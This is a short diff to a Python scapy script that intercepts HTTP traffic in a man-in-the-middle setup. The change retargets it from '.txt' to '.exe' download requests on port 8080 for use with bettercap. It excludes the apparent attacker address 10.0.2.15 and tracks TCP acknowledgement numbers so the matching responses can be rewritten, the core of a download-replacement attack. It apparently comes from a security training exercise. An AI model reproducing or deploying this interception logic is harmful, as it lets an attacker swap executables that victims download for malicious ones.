@@ -18,15 +18,15 @@ def set_load(scapy_packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         #print(scapy_packet.show())
-        if scapy_packet[scapy.TCP].dport == 80: #8080 for bettercap
+        if scapy_packet[scapy.TCP].dport == 8080: #8080 for bettercap
             print(f'HTTP Request')
-            if '.txt'.encode() in scapy_packet[scapy.Raw].load and "10.0.2.15".encode() not in scapy_packet[scapy.Raw].load:
+            if '.exe'.encode() in scapy_packet[scapy.Raw].load and "10.0.2.15".encode() not in scapy_packet[scapy.Raw].load:
                 print(f'[+] txt Request')
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport == 80: #8080 for bettercap
+        elif scapy_packet[scapy.TCP].sport == 8080: #8080 for bettercap
             print(f'HTTP Response')
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
